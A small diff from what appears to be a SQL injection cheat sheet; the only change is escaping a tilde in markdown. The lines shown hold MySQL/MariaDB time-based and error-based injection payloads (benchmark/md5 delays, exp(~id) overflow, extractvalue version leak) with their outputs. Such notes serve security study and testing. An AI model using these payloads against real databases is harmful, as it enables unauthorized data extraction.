@@ -60,7 +60,7 @@ select 'a'='b' and benchmark(10000000,md5('a')); // 1 row in set (1.565 sec)
 
 ### Error-based : Data extraction with error message
 select * from users union select foo(); # FUNCTION test.foo does not exist   
-select * from users where exp(~id); # DOUBLE value is out of range in 'exp(~\`test\`.\`users\`.\`id\`)'   
+select * from users where exp(\~id); # DOUBLE value is out of range in 'exp(\~\`test\`.\`users\`.\`id\`)'   
 select * from users where extractvalue(1,concat(0x3a,version())); #XPATH systax error: '10.4.6-MariaDB'   
 <hr>
 
